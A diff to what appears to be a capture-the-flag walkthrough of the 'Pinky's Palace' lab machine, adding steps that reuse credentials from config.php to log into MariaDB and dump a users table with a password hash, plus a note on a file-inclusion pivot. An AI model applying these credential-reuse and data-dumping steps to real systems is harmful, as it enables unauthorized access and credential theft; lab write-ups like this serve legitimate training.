@@ -608,6 +608,49 @@ cat config.php
 ?>
 ```
 
+Using the database credentials we are able to login to query and enumerate the local MySQL databases:
+```
+stefano@Pinkys-Palace:/var/www/html/nginx/pinkydb$ mysql -u secretpinkdbuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 30799
+Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| secretsdb          |
++--------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [(none)]> use secretsdb;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [secretsdb]> show tables;
++---------------------+
+| Tables_in_secretsdb |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+
+MariaDB [secretsdb]> select * from users;
++------+----------+----------------------------------+
+| id   | username | password                         |
++------+----------+----------------------------------+
+|    1 | pinky    | e09d0a6ab74963a7ad389a8ae5a79aaa |
++------+----------+----------------------------------+
+1 row in set (0.00 sec)
+```
+
 There is a local file inclusion (LFI) vulnerability in the pagegap.php file
 ```
 stefano@Pinkys-Palace:/var/www/html/nginx/pinkydb/html$ cat pageegap.php 
@@ -616,7 +659,7 @@ stefano@Pinkys-Palace:/var/www/html/nginx/pinkydb/html$ cat pageegap.php
 ?>
 ```
 
-This could allow a pivot to www-data user.
+This could allow a pivot to www-data user. The www-data group can view the `qsub` file that is owned by pinky.
 
 ## stefano Privilege Escalation
 
